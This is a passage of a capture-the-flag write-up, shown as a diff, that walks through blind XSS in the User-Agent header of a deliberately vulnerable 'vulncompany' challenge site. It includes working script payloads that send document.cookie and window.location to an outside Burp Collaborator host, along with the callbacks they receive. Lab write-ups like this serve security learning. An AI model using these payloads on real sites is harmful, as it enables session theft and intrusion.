@@ -273,3 +273,105 @@ ip=127.0.0.1&page=%2F%3Fa%3Dbb%3Dc&browser=hello%26
 ```
 
 So browser isn't subject to sanitisation by a call to cleanInput but it is still subject to a call of http_build_query which URL encodes the request body.....
+
+http_build_query seems to be the reason I can't just inject a parameter of my own choosing :D
+
+```
+└─$ php -a               
+Interactive shell
+
+php > $param = array('page' => '?a=b&b=c');
+php > echo http_build_query($param);
+page=%3Fa%3Db%26b%3Dc
+```
+
+I'm going to focus on the browser parameter as it doesn't go through the same sanitisation.
+
+OK so could the data that's being posted be viewed by someone? Perhaps some HTML injection or XSS on this param will reveal something.
+
+```
+GET / HTTP/1.1
+Host: www.vulncompany.co.uk
+User-Agent: <img src=http://n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjdkZWJlOTAxMjBiOTU5ZGI2MTAxZjI3MTMxZWNiOGExIn0=
+Upgrade-Insecure-Requests: 1
+```
+
+And I get a response back in the collab client :)
+
+```
+The Collaborator server received an HTTP request.  The request was received from IP address 178.128.46.44 at 2022-Jul-22 09:37:13 UTC.
+```
+
+```
+GET / HTTP/1.1
+Host: n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://vulncompany.co.uk/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+OK lets now try some XSS on the same to see if I can grab something useful like a cookie maybe
+
+```
+GET / HTTP/1.1
+Host: www.vulncompany.co.uk
+User-Agent: <script>var i=new Image();i.src = 'http://n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com/?cookie=' +document.cookie;document.getElementsByTagName('body')[0].appendChild(i);</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjdkZWJlOTAxMjBiOTU5ZGI2MTAxZjI3MTMxZWNiOGExIn0=
+Upgrade-Insecure-Requests: 1
+```
+
+So this works, but brings back nothing useful
+
+```
+GET /?cookie=ctfchallenge= HTTP/1.1
+Host: n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://vulncompany.co.uk/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+Maybe the window location? Although this may be the same as the Referer.
+
+```
+GET / HTTP/1.1
+Host: www.vulncompany.co.uk
+User-Agent: <script>var i=new Image();i.src = 'http://n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com/?location=' +window.location;document.getElementsByTagName('body')[0].appendChild(i);</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjdkZWJlOTAxMjBiOTU5ZGI2MTAxZjI3MTMxZWNiOGExIn0=
+Upgrade-Insecure-Requests: 1
+```
+
+Ahhh not it's not :D!
+
+```
+GET /?location=http://vulncompany.co.uk/t0p_s3cr3t_d1rect0ry_2020/?id=222 HTTP/1.1
+Host: n9xg1pbfgf5apziwg66b28moofu5iu.oastify.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://vulncompany.co.uk/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+Finally flag 2!
+
+![alt](./images/vulncompany-09.png)
